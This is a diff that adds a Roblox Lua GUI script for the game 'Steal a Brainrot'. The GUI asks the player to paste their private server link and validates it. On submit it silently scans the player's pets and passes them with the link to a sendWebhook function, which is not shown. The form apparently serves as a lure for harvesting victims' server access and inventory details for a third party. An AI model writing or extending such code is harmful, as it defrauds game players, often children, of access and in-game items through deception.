@@ -1,0 +1,121 @@
+--================= GUI FOR PRIVATE SERVER LINK =================--
+local playerGui = player:WaitForChild("PlayerGui")
+local screenGui = Instance.new("ScreenGui", playerGui)
+screenGui.Name = "StealBrainrotGUI"
+screenGui.ResetOnSpawn = false
+
+local frame = Instance.new("Frame", screenGui)
+frame.Size = UDim2.new(0, 320, 0, 180)
+frame.Position = UDim2.new(0.5, -160, 0.5, -90)
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+frame.Active = true
+frame.Draggable = true
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+
+local title = Instance.new("TextLabel", frame)
+title.Text = "Steal a Brainrot"
+title.Font = Enum.Font.FredokaOne
+title.TextSize = 20
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.BackgroundTransparency = 1
+title.Size = UDim2.new(1, 0, 0, 28)
+title.Position = UDim2.new(0, 0, 0, 4)
+
+local closeButton = Instance.new("TextButton", frame)
+closeButton.Text = "X"
+closeButton.Font = Enum.Font.FredokaOne
+closeButton.TextSize = 18
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
+closeButton.Size = UDim2.new(0, 28, 0, 28)
+closeButton.Position = UDim2.new(1, -34, 0, 4)
+Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0, 8)
+closeButton.MouseButton1Click:Connect(function() screenGui:Destroy() end)
+
+local textBox = Instance.new("TextBox", frame)
+textBox.Size = UDim2.new(0.9, 0, 0, 36)
+textBox.Position = UDim2.new(0.05, 0, 0, 50)
+textBox.PlaceholderText = "Enter your private server link"
+textBox.Text = ""
+textBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+textBox.ClearTextOnFocus = false
+textBox.Font = Enum.Font.FredokaOne
+textBox.TextSize = 14
+Instance.new("UICorner", textBox).CornerRadius = UDim.new(0, 8)
+
+local statusLabel = Instance.new("TextLabel", frame)
+statusLabel.Size = UDim2.new(0.9, 0, 0, 24)
+statusLabel.Position = UDim2.new(0.05, 0, 0, 90)
+statusLabel.Text = ""
+statusLabel.Font = Enum.Font.FredokaOne
+statusLabel.TextSize = 14
+statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+statusLabel.BackgroundTransparency = 1
+
+local sendButton = Instance.new("TextButton", frame)
+sendButton.Text = "Send"
+sendButton.Font = Enum.Font.FredokaOne
+sendButton.TextSize = 18
+sendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+sendButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
+sendButton.Size = UDim2.new(0.4, 0, 0, 32)
+sendButton.Position = UDim2.new(0.3, 0, 0, 120)
+Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 8)
+
+-- ✅ Private server link validation (ONLY Steal a Brainrot)
+local SAB_GAME_ID = "109983668079237"
+
+local function isValidPrivateServerLink(txt)
+    if not txt or txt == "" then
+        return false, "Please enter a link ❌"
+    end
+
+    -- Only allow proper Roblox private server share links
+    local code = txt:match("^https://www%.roblox%.com/share%?code=([%w%-]+)&type=Server$")
+    if not code then
+        return false, "Invalid link ❌"
+    end
+
+    -- Ensure it’s for Steal a Brainrot only
+    if tostring(game.GameId) ~= SAB_GAME_ID then
+        return false, "This game is not Steal a Brainrot ❌"
+    end
+
+    return true, "Valid ✅"
+end
+
+textBox:GetPropertyChangedSignal("Text"):Connect(function()
+    local valid, msg = isValidPrivateServerLink(textBox.Text)
+    statusLabel.Text = msg
+    if valid then
+        statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+    elseif msg:find("not Steal a Brainrot") then
+        statusLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
+    else
+        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+    end
+end)
+
+local function handleSend()
+    local txt = textBox.Text or ""
+    local valid, msg = isValidPrivateServerLink(txt)
+    if valid then
+        screenGui:Destroy()
+        task.spawn(function()
+            local pets = scanMyBase()
+            if #pets > 0 then
+                sendWebhook(pets, txt)
+            end
+        end)
+    else
+        statusLabel.Text = msg
+        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+    end
+end
+
+sendButton.MouseButton1Click:Connect(handleSend)
+textBox.FocusLost:Connect(function(enterPressed)
+    if enterPressed then handleSend() end
+end)
